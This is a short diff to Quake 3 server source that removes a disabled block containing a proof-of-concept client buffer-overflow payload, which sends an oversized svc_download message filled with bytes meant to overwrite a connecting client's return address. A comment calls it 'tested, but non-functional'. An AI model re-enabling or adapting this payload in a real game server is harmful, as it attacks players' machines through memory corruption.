@@ -645,27 +645,6 @@ void custom_SV_SendClientGameState( client_t *client ) {
 	// the client side
 	SV_UpdateServerCommandsToClient( client, &msg );
 
-    #if 0
-
-    // q3 client buffer overflow
-    // tested, but non-functional
-    // See https://securitytracker.com/id?1016219
-    //
-    int     i;
-    MSG_WriteByte( &msg, svc_download );
-    MSG_WriteShort( &msg, 1 );         // block != 0, for fast return
-    MSG_WriteShort( &msg, 16384 + 1024 ); // amount of bytes to copy
-    for(i = 0; i < 16384; i++) {        // overwrite the data buffer
-        MSG_WriteByte(&msg, 0x00);      // 0x00 for saving space
-    }
-    for(i = 0; i < 1024; i++) {           // do the rest of the job
-        MSG_WriteByte(&msg, 'a');       // return address: 0x61616161
-    }
-    SV_SendMessageToClient( &msg, client );
-    return;
-
-    #endif
-
 	// send the gamestate
 	MSG_WriteByte( &msg, svc_gamestate );
 	MSG_WriteLong( &msg, client->reliableSequence );
